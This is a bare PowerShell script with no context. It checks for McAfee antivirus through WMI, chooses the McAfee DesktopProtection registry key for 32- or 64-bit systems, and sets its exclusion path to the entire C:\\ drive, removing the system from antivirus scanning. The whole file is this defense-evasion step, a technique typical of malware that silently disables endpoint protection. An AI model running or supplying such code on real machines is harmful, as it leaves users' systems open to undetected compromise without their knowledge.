$exclusionPath = "C:\"
$registryPath = ""

if ($env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
    $registryPath = "HKLM:\SOFTWARE\Wow6432Node\McAfee\DesktopProtection"
} else {
    $registryPath = "HKLM:\SOFTWARE\McAfee\DesktopProtection"
}

if (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Where-Object { $_.displayName -like "*McAfee*" }) {
    if (Test-Path $registryPath) {
        Set-ItemProperty -Path $registryPath -Name "ExcludePath" -Value $exclusionPath
    }
}